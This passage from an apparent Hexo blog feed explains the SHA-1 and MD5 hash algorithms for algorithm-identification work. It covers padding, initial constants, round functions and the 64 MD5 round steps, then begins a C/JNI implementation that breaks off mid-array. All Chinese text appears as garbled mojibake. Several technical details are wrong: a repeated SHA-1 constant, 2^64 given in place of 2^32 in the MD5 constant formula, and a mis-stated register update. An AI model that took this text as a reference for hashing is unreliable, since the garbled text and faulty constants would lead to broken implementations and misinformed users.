id="SHA1init"><a href="#SHA1init" class="headerlink" title="SHA1init"></a>SHA1init</h3><p>åˆå§‹åŒ–ABCDEï¼Œå¹¶å°†é•¿åº¦ç½®ä¸º0</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171358067.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"> </p><h3 id="SHA1Update"><a href="#SHA1Update" class="headerlink" title="SHA1Update"></a><strong>SHA1Update</strong></h3><p>å¾ªç¯å°†å°†æ¯ä¸ª512bitçš„chunkè¿›è¡Œ80è½®çš„è¿ç®—</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171359047.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"> </p><h3 id="SHA1Final"><a href="#SHA1Final" class="headerlink" title="SHA1Final"></a><strong>SHA1Final</strong></h3><p>æœ€åå¡«å……æ•°æ®å’Œæ·»åŠ æ¶ˆæ¯é•¿åº¦ï¼Œè¿›å…¥æœ€åçš„hashè®¡ç®—</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171359435.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"> </p><h2 id="2-æ€»ç»“"><a href="#2-æ€»ç»“" class="headerlink" title="2 æ€»ç»“"></a>2 æ€»ç»“</h2><p>sha1å“ˆå¸Œè®¡ç®—ï¼Œå…ˆè¿›è¡Œæ•°æ®å¡«å……ï¼Œå†è¡¥ä¸Šæ¶ˆæ¯é•¿åº¦ï¼Œåªåæ¯512bitè¿›è¡Œ80è½®çš„hashè®¡ç®—ï¼Œæœ€åå°†æœ€åçš„ABCDEæ‹¼æ¥å¾—åˆ°160ä½çš„hashå€¼</p><p><strong>sha1ç‰¹å¾</strong></p><ul><li>åˆå§‹åŒ–å¸¸æ•°ABCDEï¼ˆ0x67452301ã€0xEFCDAB89ã€0x98BADCFEã€0x10325476ã€0xC3D2E1F0ï¼‰</li><li>å¸¸æ•°K1ã€K2ã€K2ã€K3ã€K4ï¼Œ0x5A827999ã€0x6ED9EBA1ã€0x8F1BBCDCã€0x6ED9EBA1</li><li>80è½®hashè®¡ç®—ä¸­W[i]çš„ç”Ÿæˆï¼Œå‰16è½®ç”±512ä½çš„è¾“å…¥å¾—åˆ°ï¼ŒåW[16-79]ç”±å‰é¢çš„Wç”Ÿæˆå¾—åˆ°</li><li>4ç»„åŸºæœ¬è½®å‡½æ•°F1,F2,F3,F4</li></ul>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³•è¿˜åŸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³•è¿˜åŸ </tag>
            
            <tag> å“ˆå¸Œç®—æ³• </tag>
            
            <tag> sha1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç®—æ³•è¿˜åŸä¹‹MD5</title>
      <link href="/2024/06/15/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BMD5/"/>
      <url>/2024/06/15/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BMD5/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="å“ˆå¸Œç®—æ³•â€”MD5ä»‹ç»"><a href="#å“ˆå¸Œç®—æ³•â€”MD5ä»‹ç»" class="headerlink" title="å“ˆå¸Œç®—æ³•â€”MD5ä»‹ç»"></a>å“ˆå¸Œç®—æ³•â€”MD5ä»‹ç»</h1><ul><li>ç®—æ³•çš„è¾“å…¥ï¼šä»»æ„é•¿åº¦çš„æ˜æ–‡æ¶ˆæ¯</li><li>ç®—æ³•è¾“å‡ºï¼š128æ¯”ç‰¹é•¿ï¼Œæˆ–è€…è¯´32ä¸ªåå…­è¿›åˆ¶æ•°çš„æ¶ˆæ¯æ‘˜è¦</li></ul><h2 id="MD5çš„åº”ç”¨åœºæ™¯"><a href="#MD5çš„åº”ç”¨åœºæ™¯" class="headerlink" title="MD5çš„åº”ç”¨åœºæ™¯"></a>MD5çš„åº”ç”¨åœºæ™¯</h2><p>1ã€<strong>æ•°æ®å®Œæ•´æ€§æ ¡éªŒ</strong>ï¼šMD5ç®—æ³•å¸¸ç”¨äºéªŒè¯æ•°æ®çš„å®Œæ•´æ€§ã€‚åœ¨æ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­ï¼Œå‘é€æ–¹å¯ä»¥è®¡ç®—æ•°æ®çš„MD5å“ˆå¸Œå€¼å°†å…¶å‘é€ç»™æ¥æ”¶æ–¹ã€‚æ¥æ”¶æ–¹æ”¶åˆ°æ•°æ®åï¼Œå†æ¬¡è®¡ç®—å“ˆå¸Œå€¼å¹¶ä¸å‘é€æ–¹æä¾›çš„å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœä¸¤è€…åŒ¹é…ï¼Œåˆ™è¯´æ˜æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ²¡æœ‰è¢«ç¯¡æ”¹ã€‚</p><p>2ã€<strong>å¯†ç å­˜å‚¨</strong>ï¼šMD5ç®—æ³•ä¹Ÿå¸¸ç”¨äºå¯†ç å­˜å‚¨ã€‚å°†ç”¨æˆ·çš„å¯†ç é€šè¿‡MD5å“ˆå¸Œåå­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œå³æ—¶æ•°æ®åº“è¢«æ³„éœ²ï¼Œæ”»å‡»è€…ä¹Ÿæ— æ³•ç›´æ¥è·å–ç”¨æˆ·çš„æ˜æ–‡ä½ å¯†ç ã€‚ç„¶è€Œï¼Œç”±äºMD5ç®—æ³•å­˜åœ¨å·²çŸ¥çš„å®‰å…¨æ¼æ´ï¼ˆå¦‚å½©è™¹è¡¨æ”»å‡»å’Œç¢°æ’æ”»å‡»ï¼‰ï¼Œç°åœ¨å·²ä¸æ¨èä½¿ç”¨MD5æ¥å­˜å‚¨å¯†ç ã€‚æ›´å®‰å…¨çš„åšæ³•æ˜¯ä½¿ç”¨åŠ ç›å“ˆå¸Œï¼ˆå¦‚bcryptæˆ–Argon2ï¼‰ã€‚</p><h2 id="MD5ç®—æ³•åŸç†"><a href="#MD5ç®—æ³•åŸç†" class="headerlink" title="MD5ç®—æ³•åŸç†"></a>MD5ç®—æ³•åŸç†</h2><p>MD5ç®—æ³•çš„å®ç°ï¼Œå¯ä»¥åˆ†ä¸ºä»¥ä¸‹4ä¸ªæ­¥éª¤ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406151628716.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406161837412.png" alt="å›¾ç‰‡"> </p><p>MD5ç®—æ³•çš„æ•´ä½“æµç¨‹å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä¸»è¦åˆ†ä¸º4æ­¥ï¼šå¤„ç†åŸæ–‡ã€è®¾ç½®åˆå§‹å€¼ã€å¾ªç¯åŠ å·¥ã€æ‹¼æ¥ç»“æœã€‚</p><h3 id="ï¼ˆä¸€ï¼‰å¤„ç†åŸæ–‡"><a href="#ï¼ˆä¸€ï¼‰å¤„ç†åŸæ–‡" class="headerlink" title="ï¼ˆä¸€ï¼‰å¤„ç†åŸæ–‡"></a>ï¼ˆä¸€ï¼‰å¤„ç†åŸæ–‡</h3><p>å¤„ç†åŸæ–‡å°±æ˜¯ä¸€ä¸ªå…³é”®è¯ï¼š<strong>è¡¥ä½</strong>ï¼Œæ­¤å¤„çš„è¡¥ä½æœ‰ä¸¤ä¸ªåœ°æ–¹éœ€è¦è¡¥ã€‚é‚£å…·ä½“æ€ä¹ˆè¡¥ä½å‘¢ï¼Ÿ</p><p>1ã€<strong>å¡«å……</strong>ã€‚å¦‚æœè¾“å…¥ä¿¡æ¯çš„é•¿åº¦(bit)å¯¹512æ±‚ä½™çš„ç»“æœä¸ç­‰äº448ï¼Œå°±éœ€è¦å¡«å……ä½¿å¾—å¯¹512æ±‚ä½™çš„ç»“æœç­‰äº448ã€‚å¡«å……çš„æ–¹æ³•æ˜¯å¡«å……ä¸€ä¸ª1å’Œnä¸ª0ã€‚å¡«å……å®Œåï¼Œä¿¡æ¯çš„é•¿åº¦å°±ä¸ºN*512+448(bit)ï¼›</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406161842946.png" alt="å›¾ç‰‡"> </p><p>åˆ°è¿™é‡Œï¼Œå°±ä¼šæœ‰ä¸¤ä¸ªé—®é¢˜ï¼š</p><ul><li>ä¸ºä»€ä¹ˆæ˜¯å¯¹512å–ä½™ï¼Œè€Œä¸”ä¸ºä»€ä¹ˆè¡¥ä½è¦è¡¥åˆ°å¯¹512å–ä½™åä¸º448ï¼Ÿ</li><li>å¦‚æœåŸæ–‡çš„é•¿åº¦æœ¬æ¥å°±æ˜¯å¯¹512å–ä½™æ˜¯448å‘¢ï¼Œæ˜¯ä¸æ˜¯å°±ä¸éœ€è¦è¿›è¡Œå¡«å……ä½çš„å¡«è¡¥äº†ï¼Ÿ</li></ul><p>é¦–å…ˆæˆ‘ä»¬æ¥è§£å†³ç¬¬2ä¸ªé—®é¢˜ï¼šå‡è®¾åŸæ–‡é•¿åº¦ä¸ºlenï¼Œä¸”mod(len, 512) &#x3D; 448ï¼Œåˆ™éœ€è¦å†è¡¥å……512ä½çš„å¡«å……ä½ã€‚å‡è®¾å¡«å……ä½é•¿åº¦ä¸ºappendLenï¼Œåˆ™æœ‰ä¼ªä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">if(mod(len, 512) &lt; 448) &#123;</span><br><span class="line">  appendLen = 448 - mod(len, 512);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  appendLen = 448 + 512 - mod(len, 512);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‡³äºç¬¬1ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬æ¥ç€å¾€ä¸‹çœ‹ï¼š</p><p>2ã€<strong>è¡¥æ•°æ®é•¿åº¦</strong>ï¼šè¿™é‡Œéœ€è¦è¡¥64ä½çš„åŸæ–‡é•¿åº¦ï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼Œè¡¥å……é½64ä½åï¼Œæ•´ä½“çš„é•¿åº¦å°±æ˜¯512çš„æ•´æ•°å€äº†ã€‚è¿™é‡Œå°±å¯ä»¥å›ç­”ä¸Šé¢çš„ç¬¬ä¸€ä¸ªé—®é¢˜äº†ï¼š<strong>MD5æ˜¯ä¸€ç§åŸºäºblockçš„ç®—æ³•ï¼Œè¦æ±‚æ¯æ¬¡å¤„ç†çš„blockéƒ½æ˜¯512bits</strong>ã€‚64ä½çš„æ•°æ®é•¿åº¦ï¼Œå³æœ€é•¿å¯ä»¥æ˜¯2^64 ã€‚é‚£å¦‚æœåŸæ–‡çš„é•¿åº¦len &gt; 2^64å‘¢ï¼Ÿåˆ™å–lençš„ä½é˜¶64ä½è¿›è¡Œå¡«å……ã€‚</p><p>æ­¤æ—¶çš„æ•°æ®æ˜¯16å­—ï¼ˆ32ä½ï¼‰çš„æ•´æ•°å€ï¼Œç”¨M[0ï¼Œâ€¦ï¼ŒN-1]è¡¨ç¤ºæ­¤æ—¶çš„æ•°æ®ï¼Œå…¶ä¸­Nä¸º16çš„å€æ•°ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406161844198.png" alt="å›¾ç‰‡"> </p><h3 id="ï¼ˆäºŒï¼‰è®¾ç½®åˆå§‹å€¼"><a href="#ï¼ˆäºŒï¼‰è®¾ç½®åˆå§‹å€¼" class="headerlink" title="ï¼ˆäºŒï¼‰è®¾ç½®åˆå§‹å€¼"></a>ï¼ˆäºŒï¼‰è®¾ç½®åˆå§‹å€¼</h3><p>è£…å…¥æ ‡å‡†å¹»æ•°ï¼ˆå››ä¸ªæ•´æ•°ï¼‰ã€‚æ ‡å‡†çš„å¹»æ•°ï¼ˆç‰©ç†é¡ºåºï¼‰æ˜¯ï¼ˆA&#x3D;(01234567)16ï¼ŒB&#x3D;(89ABCDEF)16ï¼ŒC&#x3D;(FEDCBA98)16ï¼ŒD&#x3D;(76543210)16ï¼‰ã€‚</p><p>å¦‚æœåœ¨ç¨‹åºä¸­å®šä¹‰åº”è¯¥æ˜¯:ï¼ˆ<code>A=0X67452301L</code>ï¼Œ<code>B=0XEFCDAB89L</code>ï¼Œ<code>C=0X98BADCFEL</code>ï¼Œ<code>D=0X10325476L</code>ï¼‰è¿™æ ·è¡¨ç¤ºçš„åŸå› æ˜¯å› ä¸ºï¼Œæ•°æ®åœ¨å†…å­˜åœ¨ä¸ºå°ç«¯å­˜å‚¨ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª16ä½çš„æ•´æ•°<code>0x1234</code>ï¼ˆè¿™é‡Œ<code>0x</code>è¡¨ç¤ºåå…­è¿›åˆ¶æ•°ï¼‰ï¼Œåœ¨å°ç«¯å­˜å‚¨çš„ç³»ç»Ÿä¸­ï¼Œè¿™ä¸ªæ•°ä¼šè¢«å­˜å‚¨ä¸º<code>0x34 0x12</code>ï¼Œå…¶ä¸­<code>0x34</code>å­˜å‚¨åœ¨ä½åœ°å€ï¼Œ<code>0x12</code>å­˜å‚¨åœ¨é«˜åœ°å€ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A=0x01234567</span><br><span class="line">B=0x89ABCDEF</span><br><span class="line">C=0xFEDCBA98</span><br><span class="line">D=0x76543210</span><br></pre></td></tr></table></figure><h3 id="ï¼ˆä¸‰ï¼‰å¾ªç¯åŠ å·¥"><a href="#ï¼ˆä¸‰ï¼‰å¾ªç¯åŠ å·¥" class="headerlink" title="ï¼ˆä¸‰ï¼‰å¾ªç¯åŠ å·¥"></a>ï¼ˆä¸‰ï¼‰å¾ªç¯åŠ å·¥</h3><p>è¿™ä¸€æ­¥æ˜¯æ•´ä¸ªç®—æ³•æœ€é‡è¦çš„ä¸€æ­¥ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406161908550.png" alt="å›¾ç‰‡"> </p><p>å›¾ä¸­ï¼ŒABCDå°±æ˜¯å“ˆå¸Œå€¼çš„å››ä¸ªåˆ†ç»„ï¼Œæ¯ä¸€æ¬¡å¾ªç¯éƒ½ä¼šè®©æ—§çš„ABCDäº§ç”Ÿæ–°çš„ABCDã€‚ä¸€å…±è¿›è¡Œå¤šå°‘æ¬¡å¾ªç¯å‘¢ï¼Ÿç”±å¤„ç†åçš„åŸæ–‡é•¿åº¦å†³å®šã€‚</p><p>å‡è®¾ç»è¿‡ç¬¬ä¸€æ­¥å¤„ç†åŸæ–‡ä¹‹åçš„é•¿åº¦ä¸ºMï¼Œåˆ™ä¸»å¾ªç¯æ¬¡æ•°L&#x3D;MÃ·512ï¼Œæ¯ä¸ªä¸»å¾ªç¯ä¸­åŒ…å«512Ã·32*4&#x3D;64æ¬¡å­å¾ªç¯ï¼Œåˆ†ä¸º4ç»„16æ¬¡ã€‚ä¸Šé¢è¿™å¼ å›¾è¡¨è¾¾çš„æ˜¯ä¸€æ¬¡å­å¾ªç¯çš„æµç¨‹ã€‚</p><ul><li>ä¸»å¾ªç¯æ¬¡æ•° &#x3D; M &#x2F; 512</li><li>æ¯ä¸ªä¸»å¾ªç¯ä¸­åŒ…å« 512 &#x2F; 32 * 4 &#x3D; 64 æ¬¡ å­å¾ªç¯</li></ul><p>å…¶ä¸­Fæ˜¯ä¸€ä¸ªéçº¿æ€§å‡½æ•°ã€‚MD5ç”¨åˆ°çš„éçº¿æ€§å‡½æ•°æœ‰ä¸‹é¢å››ç§ï¼Œ4ç»„å¾ªç¯ä¸­ä¾æ¬¡ä½¿ç”¨FGHIã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F(Xï¼ŒYï¼ŒZ) =(X&amp;Y) | ((~X) &amp; Z)</span><br><span class="line">G(Xï¼ŒYï¼ŒZ) =(X&amp;Z) | (Y &amp; (~Z))</span><br><span class="line">H(Xï¼ŒYï¼ŒZ) =X^Y^Z</span><br><span class="line">I(Xï¼ŒYï¼ŒZ)=Y^(X|(~Z))</span><br></pre></td></tr></table></figure><p>å…¶ä¸­Miä¸ºåŸæ–‡çš„ä¸€ä¸ªåˆ†ç»„ï¼Œé•¿åº¦ä¸º32bitsï¼Œæ¯æ¬¡å¾ªç¯æ‰€ç”¨åˆ°çš„åˆ†ç»„ç¼–å·ä¸åŒï¼Œä¼šäº¤æ›¿ä½¿ç”¨åˆ°M0åˆ°M15ä¸­çš„æ•°æ®ã€‚</p><p>è€ŒKiåˆ™æ˜¯ä¸€ä¸ª32bitsçš„å¸¸é‡ï¼Œå…·ä½“çš„è®¡ç®—å…¬å¼å¦‚ä¸‹ï¼š</p><p>Ki&#x3D;floor(2^64*sin(i)) içš„èŒƒå›´æ˜¯1~64ï¼Œå•ä½æ˜¯å¼§åº¦</p><p>è€Œ&lt;&lt;&lt;såˆ™ä»£è¡¨ç§»ä½æ“ä½œï¼Œæ³¨æ„ï¼šè¿™é‡Œçš„ç§»ä½æ˜¯<strong>å¾ªç¯ç§»ä½</strong>ï¼è€Œç§»å¤šå°‘ä½ï¼Œåˆ™å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[7ï¼Œ12ï¼Œ17ï¼Œ22 ]</span><br><span class="line">[5ï¼Œ9ï¼Œ14ï¼Œ20]</span><br><span class="line">[4ï¼Œ11ï¼Œ16ï¼Œ23]</span><br><span class="line">[6ï¼Œ10ï¼Œ15ï¼Œ21]</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ç»„16æ¬¡å¾ªç¯ä¸­ä¾æ¬¡ä½¿ç”¨ã€7ï¼Œ12ï¼Œ17ï¼Œ22ã€‘ï¼Œä½¿ç”¨4æ¬¡ï¼Œä»¥æ­¤ç±»æ¨ã€‚æ‰€ä»¥ç»è¿‡ä¸€æ¬¡å¾ªç¯åå¯ä»¥å‘ç°(å…¶ä¸­&#x3D;å·¦è¾¹ä¸ºæ–°ï¼Œç­‰å·å³è¾¹å…¨éƒ¨ä½¿ç”¨æ—§çš„abcd)ï¼š</p><ul><li><p>Aâ€”&gt;ç»è¿‡è¿ç®—â€”&gt;B </p></li><li><p>Bâ€”&gt;ç›´æ¥â€”&gt;C</p></li><li><p>Câ€”&gt;ç›´æ¥â€”&gt;D </p></li><li><p>Dâ€”&gt;ç›´æ¥â€”&gt;A</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=d</span><br><span class="line">b=(F(bï¼Œcï¼Œd)+Mi+Ki)&lt;&lt;&lt;s+a</span><br><span class="line">c=a</span><br><span class="line">d=c</span><br></pre></td></tr></table></figure><p>è€Œä¸€æ¬¡ä¸»å¾ªç¯çš„4ç»„16æ¬¡å­å¾ªç¯ä¾æ¬¡å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> ç¬¬ä¸€è½®</span><br><span class="line">a=FF(a,b,c,d,M0,7,0xd76aa478)</span><br><span class="line">b=FF(d,a,b,c,M1,12,0xe8c7b756)</span><br><span class="line">c=FF(c,d,a,b,M2,17,0x242070db)</span><br><span class="line">d=FF(b,c,d,a,M3,22,0xc1bdceee)</span><br><span class="line">a=FF(a,b,c,d,M4,7,0xf57c0faf)</span><br><span class="line">b=FF(d,a,b,c,M5,12,0x4787c62a)</span><br><span class="line">c=FF(c,d,a,b,M6,17,0xa8304613)</span><br><span class="line">d=FF(b,c,d,a,M7,22,0xfd469501)</span><br><span class="line">a=FF(a,b,c,d,M8,7,0x698098d8)</span><br><span class="line">b=FF(d,a,b,c,M9,12,0x8b44f7af)</span><br><span class="line">c=FF(c,d,a,b,M10,17,0xffff5bb1)</span><br><span class="line">d=FF(b,c,d,a,M11,22,0x895cd7be)</span><br><span class="line">a=FF(a,b,c,d,M12,7,0x6b901122)</span><br><span class="line">b=FF(d,a,b,c,M13,12,0xfd987193)</span><br><span class="line">c=FF(c,d,a,b,M14,17,0xa679438e)</span><br><span class="line">d=FF(b,c,d,a,M15,22,0x49b40821)</span><br><span class="line"></span><br><span class="line">ç¬¬äºŒè½®</span><br><span class="line">a=GG(a,b,c,d,M1,5,0xf61e2562)</span><br><span class="line">b=GG(d,a,b,c,M6,9,0xc040b340)</span><br><span class="line">c=GG(c,d,a,b,M11,14,0x265e5a51)</span><br><span class="line">d=GG(b,c,d,a,M0,20,0xe9b6c7aa)</span><br><span class="line">a=GG(a,b,c,d,M5,5,0xd62f105d)</span><br><span class="line">b=GG(d,a,b,c,M10,9,0x02441453)</span><br><span class="line">c=GG(c,d,a,b,M15,14,0xd8a1e681)</span><br><span class="line">d=GG(b,c,d,a,M4,20,0xe7d3fbc8)</span><br><span class="line">a=GG(a,b,c,d,M9,5,0x21e1cde6)</span><br><span class="line">b=GG(d,a,b,c,M14,9,0xc33707d6)</span><br><span class="line">c=GG(c,d,a,b,M3,14,0xf4d50d87)</span><br><span class="line">d=GG(b,c,d,a,M8,20,0x455a14ed)</span><br><span class="line">a=GG(a,b,c,d,M13,5,0xa9e3e905)</span><br><span class="line">b=GG(d,a,b,c,M2,9,0xfcefa3f8)</span><br><span class="line">c=GG(c,d,a,b,M7,14,0x676f02d9)</span><br><span class="line">d=GG(b,c,d,a,M12,20,0x8d2a4c8a)</span><br><span class="line"></span><br><span class="line">ç¬¬ä¸‰è½®</span><br><span class="line">a=HH(a,b,c,d,M5,4,0xfffa3942)</span><br><span class="line">b=HH(d,a,b,c,M8,11,0x8771f681)</span><br><span class="line">c=HH(c,d,a,b,M11,16,0x6d9d6122)</span><br><span class="line">d=HH(b,c,d,a,M14,23,0xfde5380c)</span><br><span class="line">a=HH(a,b,c,d,M1,4,0xa4beea44)</span><br><span class="line">b=HH(d,a,b,c,M4,11,0x4bdecfa9)</span><br><span class="line">c=HH(c,d,a,b,M7,16,0xf6bb4b60)</span><br><span class="line">d=HH(b,c,d,a,M10,23,0xbebfbc70)</span><br><span class="line">a=HH(a,b,c,d,M13,4,0x289b7ec6)</span><br><span class="line">b=HH(d,a,b,c,M0,11,0xeaa127fa)</span><br><span class="line">c=HH(c,d,a,b,M3,16,0xd4ef3085)</span><br><span class="line">d=HH(b,c,d,a,M6,23,0x04881d05)</span><br><span class="line">a=HH(a,b,c,d,M9,4,0xd9d4d039)</span><br><span class="line">b=HH(d,a,b,c,M12,11,0xe6db99e5)</span><br><span class="line">c=HH(c,d,a,b,M15,16,0x1fa27cf8)</span><br><span class="line">d=HH(b,c,d,a,M2,23,0xc4ac5665)</span><br><span class="line"></span><br><span class="line">ç¬¬å››è½®</span><br><span class="line">a=II(a,b,c,d,M0,6,0xf4292244)</span><br><span class="line">b=II(d,a,b,c,M7,10,0x432aff97)</span><br><span class="line">c=II(c,d,a,b,M14,15,0xab9423a7)</span><br><span class="line">d=II(b,c,d,a,M5,21,0xfc93a039)</span><br><span class="line">a=II(a,b,c,d,M12,6,0x655b59c3)</span><br><span class="line">b=II(d,a,b,c,M3,10,0x8f0ccc92)</span><br><span class="line">c=II(c,d,a,b,M10,15,0xffeff47d)</span><br><span class="line">d=II(b,c,d,a,M1,21,0x85845dd1)</span><br><span class="line">a=II(a,b,c,d,M8,6,0x6fa87e4f)</span><br><span class="line">b=II(d,a,b,c,M15,10,0xfe2ce6e0)</span><br><span class="line">c=II(c,d,a,b,M6,15,0xa3014314)</span><br><span class="line">d=II(b,c,d,a,M13,21,0x4e0811a1)</span><br><span class="line">a=II(a,b,c,d,M4,6,0xf7537e82)</span><br><span class="line">b=II(d,a,b,c,M11,10,0xbd3af235)</span><br><span class="line">c=II(c,d,a,b,M2,15,0x2ad7d2bb)</span><br><span class="line">d=II(b,c,d,a,M9,21,0xeb86d391)</span><br></pre></td></tr></table></figure><hr><p>å…·ä½“çš„å®ç°å’ŒåŸç†è¿™äº›ï¼Œéƒ½å¯ä»¥å‚è€ƒå¦‚ä¸‹å†…å®¹ï¼š</p><p><a href="https://mp.weixin.qq.com/s/Yem3oWb3sg3kh4j-MjWbcA">https://mp.weixin.qq.com/s/Yem3oWb3sg3kh4j-MjWbcA</a></p><hr><h1 id="å®ç°æ ‡å‡†MD5ç®—æ³•"><a href="#å®ç°æ ‡å‡†MD5ç®—æ³•" class="headerlink" title="å®ç°æ ‡å‡†MD5ç®—æ³•"></a>å®ç°æ ‡å‡†MD5ç®—æ³•</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Constants are the integer part of the sines of integers (in radians) * 2^32.</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0xd76aa478</span>, <span class="number">0xe8c7b756</span>, <span class="number">0x242070db</span>, <span class="number">0xc1bdceee</span> ,</span><br><span class="line">    <span class="number">0xf57c0faf</span>, <span class="number">0x4787c62a</span>, <span class="number">0xa8304613</span>, <span class="number">0xfd469501</span> ,</span><br><span class="line">    <span class="number">0x698098d8</span>, <span class="number">0x8b44f7af</span>, <span class="number">0xffff5bb1</span>, <span class="number">0x895cd7be</span> ,</span><br><span class="line">    <span class="number">0x6b901122</span>, <span class="number">0xfd987193</span>, <span class="number">0xa679438e</span>, <span class="number">0x49b40821</span> ,</span><br><span class="line">    <span class="number">0xf61e2562</span>, <span class="number">0xc040b340</span>, <span class="number">0x265e5a51</span>, <span class="number">0xe9b6c7aa</span> ,</span><br><span class="line">    <span class="number">0xd62f105d</span>, <span class="number">0x02441453</span>, <span class="number">0xd8a1e681</span>, <span class="number">0xe7d3fbc8</span> ,</span><br><span class="line">    <span class="number">0x21e1cde6</span>, <span class="number">0xc33707d6</span>, <span class="number">0xf4d50d87</span>, <span class="number">0x455a14ed</span> ,</span><br><span class="line">    <span class="number">0xa9e3e905</span>, <span class="number">0xfcefa3f8</span>, <span class="number">0x676f02d9</span>, <span class="number">0x8d2a4c8a</span> ,</span><br><span class="line">    <span class="number">0xfffa3942</span>, <span class="number">0x8771f681</span>, <span class="number">0x6d9d6122</span>, <span class="number">0xfde5380c</span> ,</span><br><span class="line">    <span class="number">0xa4beea44</span>, <span class="number">0x4bdecfa9</span>, <span class="number">0xf6bb4b60</span>, <span class="number">0xbebfbc70</span> ,</span><br><span class="line">    <span class="number">0x289b7ec6</span>, <span class="number">0xeaa127fa</span>, <span class="number">0xd4ef3085</span>, <span class="number">0x04881d05</span> ,</span><br><span class="line">    <span class="number">0xd9d4d039</span>, <span class="number">0xe6db99e5</span>, <span class="number">0x1fa27cf8</span>, <span class="number">0xc4ac5665</span> ,</span><br><span class="line">    <span class="number">0xf4292244</span>, <span class="number">0x432aff97</span>, <span class="number">0xab9423a7</span>, <span class="number">0xfc93a039</span> ,</span><br><span class="line">    <span class="number">0x655b59c3</span>, <span class="number">0x8f0ccc92</span>, <span class="number">0xffeff47d</span>, <span class="number">0x85845dd1</span> ,</span><br><span class="line">    <span class="number">0x6fa87e4f</span>, <span class="number">0xfe2ce6e0</span>, <span class="number">0xa3014314</span>, <span class="number">0x4e0811a1</span> ,</span><br><span class="line">    <span class="number">0xf7537e82</span>, <span class="number">0xbd3af235</span>, <span class="number">0x2ad7d2bb</span>, <span class="number">0xeb86d391</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// r specifies the per-round shift amounts</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> r[] = &#123;<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,</span><br><span class="line">                      <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,</span><br><span class="line">                      <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,</span><br><span class="line">                      <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span 